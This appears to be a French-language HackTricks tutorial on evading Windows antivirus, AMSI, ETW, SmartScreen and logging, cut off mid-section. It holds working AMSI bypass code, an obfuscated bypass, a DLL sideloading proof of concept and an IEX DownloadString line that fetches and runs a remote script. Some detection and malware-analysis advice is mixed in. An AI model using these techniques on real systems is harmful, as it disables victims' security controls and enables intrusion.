# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Cette page a été écrite par** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Arrêter Defender

- [defendnot](https://github.com/es3n1n/defendnot) : Un outil pour empêcher Windows Defender de fonctionner.
- [no-defender](https://github.com/es3n1n/no-defender) : Un outil pour empêcher Windows Defender de fonctionner en simulant un autre AV.
- [Désactiver Defender si vous êtes admin](basic-powershell-for-pentesters/README.md)

## **AV Evasion Methodology**

Actuellement, les AV utilisent différentes méthodes pour vérifier si un fichier est malveillant ou non : static detection, dynamic analysis, et pour les EDR plus avancés, behavioural analysis.

### **Static detection**

Static detection s'obtient en marquant des chaînes connues malveillantes ou des tableaux d'octets dans un binaire ou un script, et aussi en extrayant des informations depuis le fichier lui‑même (par ex. file description, company name, digital signatures, icon, checksum, etc.). Cela signifie que l'utilisation d'outils publics connus peut vous faire détecter plus facilement, car ils ont probablement été analysés et marqués comme malveillants. Il existe plusieurs façons de contourner ce type de détection :

- **Encryption**

Si vous chiffrez le binaire, il n'y aura aucun moyen pour l'AV de détecter votre programme, mais vous aurez besoin d'un loader pour déchiffrer et exécuter le programme en mémoire.

- **Obfuscation**

Parfois, il suffit de modifier quelques chaînes dans votre binaire ou script pour passer l'AV, mais cela peut être une tâche chronophage selon ce que vous essayez d'obfusquer.

- **Custom tooling**

Si vous développez vos propres outils, il n'y aura pas de signatures connues comme malveillantes, mais cela demande beaucoup de temps et d'efforts.

> [!TIP]
> Un bon moyen pour vérifier la détection statique par Windows Defender est [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Il divise essentiellement le fichier en plusieurs segments puis demande à Defender de scanner chacun d'eux individuellement ; de cette façon, il peut vous dire exactement quelles chaînes ou quels octets sont signalés dans votre binaire.

Je vous recommande vivement de consulter cette [playlist YouTube](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) sur l'AV Evasion pratique.

### **Dynamic analysis**

Dynamic analysis consiste à exécuter votre binaire dans un sandbox et à surveiller les activités malveillantes (par ex. tenter de déchiffrer et lire les mots de passe du navigateur, effectuer un minidump sur LSASS, etc.). Cette partie peut être un peu plus délicate, mais voici quelques techniques pour échapper aux sandboxes.

- **Sleep before execution** Selon la manière dont c'est implémenté, c'est un excellent moyen de contourner la dynamic analysis des AV. Les AV ont un temps très court pour analyser les fichiers afin de ne pas interrompre le flux de travail de l'utilisateur, donc utiliser de longs sleeps peut perturber l'analyse des binaires. Le problème est que de nombreux sandboxes d'AV peuvent simplement sauter le sleep selon leur implémentation.
- **Checking machine's resources** Habituellement, les sandboxes disposent de très peu de ressources (par ex. < 2GB RAM), sinon elles pourraient ralentir la machine de l'utilisateur. Vous pouvez aussi faire preuve de créativité ici, par exemple en vérifiant la température du CPU ou même la vitesse des ventilateurs ; tout n'est pas implémenté dans le sandbox.
- **Machine-specific checks** Si vous voulez cibler un utilisateur dont la workstation est jointe au domaine "contoso.local", vous pouvez vérifier le domaine de l'ordinateur pour voir s'il correspond à celui que vous avez spécifié ; si ce n'est pas le cas, vous pouvez faire en sorte que votre programme se termine.

Il se trouve que le nom d'ordinateur du Sandbox de Microsoft Defender est HAL9TH ; vous pouvez donc vérifier le nom de l'ordinateur dans votre malware avant la détonation ; si le nom correspond à HAL9TH, cela signifie que vous êtes dans le sandbox de defender, et vous pouvez faire en sorte que votre programme se termine.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Quelques autres très bons conseils de [@mgeeky](https://twitter.com/mariuszbit) pour lutter contre les Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> canal #malware-dev</p></figcaption></figure>

Comme nous l'avons dit plus haut dans ce post, **les outils publics** finiront par **être détectés**, donc vous devriez vous poser la question suivante :

Par exemple, si vous voulez dumper LSASS, **avez‑vous vraiment besoin d'utiliser mimikatz** ? Ou pourriez‑vous utiliser un autre projet moins connu qui dumpe aussi LSASS.

La bonne réponse est probablement la seconde. En prenant mimikatz comme exemple, c'est probablement l'un des, sinon le plus détecté par les AVs et EDRs ; bien que le projet soit super cool, c'est aussi un cauchemar pour contourner les AVs, donc cherchez simplement des alternatives pour ce que vous essayez d'accomplir.

> [!TIP]
> Lorsque vous modifiez vos payloads pour l'évasion, assurez‑vous de **désactiver la soumission automatique d'échantillons** dans defender, et s'il vous plaît, sérieusement, **NE PAS UPLOADER SUR VIRUSTOTAL** si votre objectif est d'obtenir l'évasion sur le long terme. Si vous voulez vérifier si votre payload est détecté par un AV particulier, installez‑le sur une VM, essayez de désactiver la soumission automatique d'échantillons, et testez‑y jusqu'à ce que vous soyez satisfait du résultat.

## EXEs vs DLLs

Chaque fois que c'est possible, privilégiez toujours l'utilisation de DLLs pour l'évasion ; d'après mon expérience, les fichiers DLL sont généralement bien moins détectés et analysés, c'est donc une astuce très simple à utiliser pour éviter la détection dans certains cas (si votre payload a bien sûr un moyen d'être exécuté en tant que DLL).

Comme nous pouvons le voir sur cette image, un DLL Payload de Havoc a un taux de détection de 4/26 sur antiscan.me, tandis que le payload EXE a un taux de détection de 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

Nous allons maintenant montrer quelques astuces que vous pouvez utiliser avec des fichiers DLL pour être beaucoup plus furtif.

## DLL Sideloading & Proxying

**DLL Sideloading** tire parti de l'ordre de recherche des DLL utilisé par le loader en positionnant l'application victime et le(s) payload(s) malveillant(s) côte à côte.

Vous pouvez rechercher des programmes susceptibles au DLL Sideloading en utilisant [Siofra](https://github.com/Cybereason/siofra) et le script powershell suivant :
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Cette commande affichera la liste des programmes susceptibles de DLL hijacking dans "C:\Program Files\\" et les fichiers DLL qu'ils tentent de charger.

Je vous recommande vivement d'**explorer vous-même les programmes DLL Hijackable/Sideloadable**, cette technique est assez discrète si elle est bien exécutée, mais si vous utilisez des programmes DLL Sideloadable connus publiquement, vous pouvez facilement vous faire attraper.

Le simple fait de placer une DLL malveillante portant le nom qu'un programme s'attend à charger ne suffira pas à exécuter votre payload, car le programme attend certaines fonctions spécifiques dans cette DLL. Pour résoudre ce problème, nous utiliserons une autre technique appelée **DLL Proxying/Forwarding**.

**DLL Proxying** redirige les appels qu'un programme effectue depuis la DLL proxy (et malveillante) vers la DLL originale, préservant ainsi la fonctionnalité du programme et permettant de gérer l'exécution de votre payload.

J'utiliserai le projet [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) de [@flangvik](https://twitter.com/Flangvik/)

Voici les étapes que j'ai suivies:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
La dernière commande nous fournira 2 fichiers : un modèle de code source de DLL et la DLL originale renommée.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Voici les résultats :

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Notre shellcode (encodé avec [SGN](https://github.com/EgeBalci/sgn)) et le proxy DLL affichent tous les deux un taux de détection de 0/26 sur [antiscan.me](https://antiscan.me) ! J'appellerais cela un succès.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Je **recommande vivement** de regarder [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) sur DLL Sideloading et aussi [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) pour en apprendre davantage sur ce que nous avons abordé plus en profondeur.

### Abuser des exports forwardés (ForwardSideLoading)

Les modules Windows PE peuvent exporter des fonctions qui sont en réalité des "forwarders" : au lieu de pointer vers du code, l'entrée d'export contient une chaîne ASCII de la forme `TargetDll.TargetFunc`. Lorsqu'un appelant résout l'export, le loader Windows va :

- Charger `TargetDll` si ce n'est pas déjà chargé
- Résoudre `TargetFunc` au sein de celui-ci

Comportements clés à comprendre :
- Si `TargetDll` est une KnownDLL, elle est fournie depuis l'espace de noms protégé des KnownDLLs (ex. : ntdll, kernelbase, ole32).
- Si `TargetDll` n'est pas une KnownDLL, l'ordre de recherche standard des DLL est utilisé, qui inclut le répertoire du module effectuant la résolution du forward.

Cela permet une primitive de sideloading indirecte : trouvez une DLL signée qui exporte une fonction forwardée vers un nom de module non-KnownDLL, puis placez cette DLL signée dans le même répertoire qu'une DLL contrôlée par l'attaquant portant exactement le nom du module cible forwardé. Lorsque l'export forwardé est invoqué, le loader résout le forward et charge votre DLL depuis le même répertoire, exécutant votre DllMain.

Exemple observé sous Windows 11 :
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` n'est pas un KnownDLL, donc il est résolu selon l'ordre de recherche normal.

PoC (copier-coller) : 1) Copier la DLL système signée dans un dossier accessible en écriture
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Déposez un `NCRYPTPROV.dll` malveillant dans le même dossier. Un DllMain minimal suffit pour obtenir l'exécution de code ; vous n'avez pas besoin d'implémenter la fonction transférée pour déclencher DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Déclencher le transfert avec un LOLBin signé :
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Comportement observé:
- rundll32 (signed) charge la side-by-side `keyiso.dll` (signed)
- Lors de la résolution de `KeyIsoSetAuditingInterface`, le chargeur suit le forward vers `NCRYPTPROV.SetAuditingInterface`
- Le chargeur charge ensuite `NCRYPTPROV.dll` depuis `C:\test` et exécute son `DllMain`
- Si `SetAuditingInterface` n'est pas implémentée, vous obtiendrez une erreur "missing API" seulement après que `DllMain` a déjà été exécuté

Hunting tips:
- Concentrez-vous sur les exports forwardés dont le module cible n'est pas un KnownDLL. KnownDLLs sont listées sous `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Vous pouvez énumérer les exports forwardés avec des outils tels que:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Voir l'inventaire des forwarders Windows 11 pour rechercher des candidats: https://hexacorn.com/d/apis_fwd.txt

Idées de détection/défense :
- Surveiller les LOLBins (par ex., rundll32.exe) qui chargent des signed DLLs depuis des non-system paths, puis chargent des non-KnownDLLs portant le même nom de base depuis ce répertoire
- Alerter sur des chaînes process/module comme : `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` dans des user-writable paths
- Appliquer des politiques d'intégrité du code (WDAC/AppLocker) et refuser write+execute dans les répertoires d'application

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Vous pouvez utiliser Freeze pour charger et exécuter votre shellcode de manière furtive.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion n'est qu'un jeu du chat et de la souris : ce qui fonctionne aujourd'hui peut être détecté demain, ne comptez donc jamais sur un seul outil ; si possible, essayez de chaîner plusieurs evasion techniques.

## AMSI (Anti-Malware Scan Interface)

AMSI a été créé pour empêcher les "fileless malware". À l'origine, les AVs ne pouvaient scanner que les fichiers sur le disque ; donc si vous pouviez exécuter des payloads directement in-memory, l'AV ne pouvait rien faire pour l'empêcher, car il n'avait pas suffisamment de visibilité.

La fonctionnalité AMSI est intégrée dans ces composants de Windows.

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Il permet aux solutions antivirus d'inspecter le comportement des scripts en exposant le contenu des scripts sous une forme non chiffrée et non obfusquée.

Running `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` will produce the following alert on Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Remarquez qu'il préfixe par `amsi:` puis le chemin vers l'exécutable depuis lequel le script a été lancé, ici powershell.exe

Nous n'avons déposé aucun fichier sur le disque, mais avons tout de même été détectés in-memory à cause d'AMSI.

De plus, à partir de **.NET 4.8**, le code C# passe lui aussi par AMSI. Cela affecte même `Assembly.Load(byte[])` pour le chargement/exécution in-memory. C'est pourquoi il est recommandé d'utiliser des versions plus anciennes de .NET (comme 4.7.2 ou inférieures) pour l'exécution in-memory si vous voulez échapper à AMSI.

Il existe plusieurs façons de contourner AMSI :

- **Obfuscation**

Étant donné qu'AMSI fonctionne principalement avec des détections statiques, modifier les scripts que vous tentez de charger peut être un bon moyen d'échapper à la détection.

Cependant, AMSI est capable de déobfusquer les scripts même s'ils ont plusieurs couches d'obfuscation, donc l'obfuscation peut être une mauvaise option selon la manière dont elle est réalisée. Cela rend l'évasion moins simple. Parfois, il suffit de changer quelques noms de variables pour passer, donc tout dépend du niveau d'alerte.

- **AMSI Bypass**

Comme AMSI est implémenté en chargeant une DLL dans le processus powershell (ainsi que cscript.exe, wscript.exe, etc.), il est possible d'y toucher facilement même en tant qu'utilisateur non privilégié. En raison de ce défaut d'implémentation, des chercheurs ont trouvé plusieurs façons d'échapper au scan AMSI.

**Forcing an Error**

Forcer l'échec de l'initialisation d'AMSI (amsiInitFailed) fera en sorte qu'aucun scan ne soit lancé pour le processus courant. Cela a été initialement divulgué par [Matt Graeber](https://twitter.com/mattifestation) et Microsoft a développé une signature pour empêcher une utilisation plus large.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Il a suffi d'une seule ligne de code powershell pour rendre AMSI inutilisable pour le processus powershell en cours. Cette ligne a bien sûr été détectée par AMSI lui-même, donc une modification est nécessaire pour pouvoir utiliser cette technique.

Voici un AMSI bypass modifié que j'ai pris depuis ce [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Keep in mind, that this will probably get flagged once this post comes out, so you should not publish any code if your plan is staying undetected.

**Memory Patching**

Cette technique a été initialement découverte par [@RastaMouse](https://twitter.com/_RastaMouse/) et consiste à trouver l'adresse de la fonction "AmsiScanBuffer" dans amsi.dll (responsable de l'analyse de l'entrée fournie par l'utilisateur) et à la remplacer par des instructions renvoyant le code E_INVALIDARG ; de cette façon, le résultat de l'analyse renverra 0, interprété comme un résultat propre.

> [!TIP]
> Please read [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) for a more detailed explanation.

Il existe aussi de nombreuses autres techniques utilisées pour bypasser AMSI avec powershell, consultez [**cette page**](basic-powershell-for-pentesters/index.html#amsi-bypass) et [**ce dépôt**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) pour en apprendre davantage.

### Blocage d'AMSI en empêchant le chargement de amsi.dll (LdrLoadDll hook)

AMSI n'est initialisé qu'après que `amsi.dll` a été chargé dans le processus courant. Un contournement robuste et indépendant du langage consiste à placer un user‑mode hook sur `ntdll!LdrLoadDll` qui renvoie une erreur lorsque le module demandé est `amsi.dll`. En conséquence, AMSI ne se charge jamais et aucune analyse n'est effectuée pour ce processus.

Implementation outline (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Remarques
- Fonctionne avec PowerShell, WScript/CScript et des loaders personnalisés (tout ce qui chargerait autrement AMSI).
- Associez à l'envoi de scripts via stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) pour éviter les artefacts de ligne de commande trop longs.
- Observé utilisé par des loaders exécutés via des LOLBins (par ex., `regsvr32` appelant `DllRegisterServer`).

This tools [https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail) also generates script to bypass AMSI.

**Supprimer la signature détectée**

Vous pouvez utiliser un outil tel que **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** et **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** pour supprimer la signature AMSI détectée de la mémoire du processus courant. Cet outil fonctionne en scannant la mémoire du processus courant à la recherche de la signature AMSI puis en l'écrasant avec des instructions NOP, la supprimant effectivement de la mémoire.

**Produits AV/EDR qui utilisent AMSI**

Vous pouvez trouver une liste des produits AV/EDR qui utilisent AMSI dans **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Utiliser PowerShell version 2**
Si vous utilisez PowerShell version 2, AMSI ne sera pas chargé, vous pouvez donc exécuter vos scripts sans qu'AMSI les scanne. Vous pouvez procéder ainsi :
```bash
powershell.exe -version 2
```
## Journalisation PowerShell

La journalisation PowerShell est une fonctionnalité qui permet d'enregistrer toutes les commandes PowerShell exécutées sur un système. Cela peut être utile pour l'audit et le dépannage, mais cela peut aussi être un **problème pour les attaquants qui veulent échapper à la détection**.

Pour contourner la journalisation PowerShell, vous pouvez utiliser les techniques suivantes :

- **Désactiver PowerShell Transcription et Module Logging** : vous pouvez utiliser un outil tel que [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) à cet effet.
- **Utiliser PowerShell version 2** : si vous utilisez PowerShell version 2, AMSI ne sera pas chargé, vous pouvez donc exécuter vos scripts sans être scannés par AMSI. Vous pouvez faire ceci : `powershell.exe -version 2`
- **Utiliser une session PowerShell non gérée** : utilisez [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) pour lancer un powershell sans défenses (c'est ce que `powerpick` from Cobal Strike utilise).


## Obfuscation

> [!TIP]
> Plusieurs techniques d'obfuscation reposent sur le chiffrement des données, ce qui augmentera l'entropie du binaire et facilitera la détection par les AVs et EDRs. Faites attention à cela et n'appliquez éventuellement le chiffrement qu'à des sections spécifiques de votre code qui sont sensibles ou doivent être cachées.

### Déobfuscation des binaires .NET protégés par ConfuserEx

Lors de l'analyse de malware qui utilise ConfuserEx 2 (ou des forks commerciaux), il est courant de rencontrer plusieurs couches de protection qui bloqueront les décompilateurs et les sandboxes. Le flux de travail ci-dessous restaure de manière fiable un IL proche de l'original qui peut ensuite être décompilé en C# avec des outils tels que dnSpy ou ILSpy.

1.  Suppression de l'anti-tampering – ConfuserEx chiffre chaque *method body* et le déchiffre dans le constructeur statique du *module* (`<Module>.cctor`). Cela modifie aussi le checksum du PE de sorte que toute modification fera planter le binaire. Utilisez **AntiTamperKiller** pour localiser les tables de métadonnées chiffrées, récupérer les clés XOR et réécrire un assembly propre :
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
La sortie contient les 6 paramètres anti-tamper (`key0-key3`, `nameHash`, `internKey`) qui peuvent être utiles lors de la construction de votre propre unpacker.

2.  Restauration des symboles / du contrôle de flux – passez le fichier *clean* à **de4dot-cex** (un fork de de4dot compatible ConfuserEx).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags :
• `-p crx` – sélectionner le profil ConfuserEx 2  
• de4dot annulera le control-flow flattening, restaurera les namespaces, classes et noms de variables originaux et déchiffrera les chaînes constantes.

3.  Suppression des proxy-calls – ConfuserEx remplace les appels directs de méthode par des wrappers légers (a.k.a *proxy calls*) pour compliquer davantage la décompilation. Supprimez-les avec **ProxyCall-Remover** :
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Après cette étape vous devriez observer des API .NET normales telles que `Convert.FromBase64String` ou `AES.Create()` au lieu de fonctions wrapper opaques (`Class8.smethod_10`, …).

4.  Nettoyage manuel – exécutez le binaire résultant sous dnSpy, cherchez de gros blobs Base64 ou l'utilisation de `RijndaelManaged`/`TripleDESCryptoServiceProvider` pour localiser le vrai payload. Souvent le malware le stocke comme un tableau d'octets encodé TLV initialisé dans `<Module>.byte_0`.

La chaîne ci-dessus restaure le flux d'exécution **sans** nécessiter d'exécuter l'échantillon malveillant – utile quand on travaille sur une station hors ligne.

> 🛈  ConfuserEx produit un attribut personnalisé nommé `ConfusedByAttribute` qui peut être utilisé comme IOC pour trier automatiquement les samples.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: Obfuscateur C#**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): L'objectif de ce projet est de fournir un fork open-source de la suite de compilation [LLVM](http://www.llvm.org/) capable d'améliorer la sécurité logicielle via la [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) et le tamper-proofing.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator démontre comment utiliser le langage `C++11/14` pour générer, au moment de la compilation, du code obfusqué sans utiliser d'outil externe et sans modifier le compilateur.
- [**obfy**](https://github.com/fritzone/obfy): Ajoute une couche d'opérations obfusquées générées par le framework de métaprogrammation de templates C++ qui rendra la tâche de la personne souhaitant craquer l'application un peu plus difficile.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz est un obfuscateur binaire x64 capable d'obfusquer différents fichiers PE incluant : .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame est un moteur de code metamorphique simple pour exécutables arbitraires.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator est un framework d'obfuscation de code fin pour les langages supportés par LLVM utilisant ROP (return-oriented programming). ROPfuscator obfusque un programme au niveau du code assembleur en transformant des instructions régulières en chaînes ROP, contrecarrant notre conception naturelle du flux de contrôle.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt est un crypter .NET PE écrit en Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor est capable de convertir des EXE/DLL existants en shellcode puis de les charger

## SmartScreen & MoTW

Vous avez peut‑être vu cet écran en téléchargeant certains exécutables depuis Internet et en les exécutant.

Microsoft Defender SmartScreen est un mécanisme de sécurité conçu pour protéger l'utilisateur final contre l'exécution d'applications potentiellement malveillantes.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen fonctionne principalement selon une approche basée sur la réputation, ce qui signifie que les applications peu téléchargées déclencheront SmartScreen, alertant et empêchant l'utilisateur final d'exécuter le fichier (bien que le fichier puisse toujours être exécuté en cliquant sur More Info -> Run anyway).

**MoTW** (Mark of The Web) is an [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) with the name of Zone.Identifier which is automatically created upon download files from the internet, along with the URL it was downloaded from.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Vérification du Zone.Identifier ADS pour un fichier téléchargé depuis Internet.</p></figcaption></figure>

> [!TIP]
> Il est important de noter que les exécutables signés avec un certificat de signature **de confiance** **ne déclencheront pas SmartScreen**.

Une méthode très efficace pour empêcher que vos payloads obtiennent le Mark of The Web est de les empaqueter à l'intérieur d'une sorte de conteneur comme une ISO. Cela s'explique par le fait que le Mark-of-the-Web (MOTW) **ne peut pas** être appliqué aux volumes **non NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) est un outil qui emballe des payloads dans des conteneurs de sortie pour échapper au Mark-of-the-Web.

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) est un mécanisme de journalisation puissant dans Windows qui permet aux applications et composants système de consigner des événements. Cependant, il peut aussi être utilisé par les produits de sécurité pour surveiller et détecter des activités malveillantes.

De la même manière qu'AMSI peut être désactivé (contourné), il est aussi possible de faire en sorte que la fonction **`EtwEventWrite`** du processus en espace utilisateur retourne immédiatement sans consigner d'événements. Cela se fait en patchant la fonction en mémoire pour qu'elle retourne immédiatement, désactivant ainsi la journalisation ETW pour ce processus.

Vous pouvez trouver plus d'infos dans **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Le chargement de binaires C# en mémoire est connu depuis un certain temps et reste un excellent moyen d'exécuter vos outils post-exploitation sans être détecté par AV.

Puisque le payload sera chargé directement en mémoire sans toucher le disque, il faudra seulement s'occuper de patcher AMSI pour l'ensemble du processus.

La plupart des frameworks C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) offrent déjà la possibilité d'exécuter des assemblies C# directement en mémoire, mais il existe différentes façons de procéder :

- **Fork\&Run**

Cela implique de **lancer un nouveau processus sacrificiel**, d'injecter votre code malveillant post-exploitation dans ce nouveau processus, d'exécuter votre code malveillant et, une fois terminé, de tuer le nouveau processus. Cela présente des avantages et des inconvénients. L'avantage de la méthode fork and run est que l'exécution a lieu **en dehors** du processus de notre implant Beacon. Cela signifie que si une action post-exploitation tourne mal ou est détectée, il y a une **bien meilleure chance** que notre **implant survive.** L'inconvénient est que vous avez une **plus grande probabilité** d'être détecté par des **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

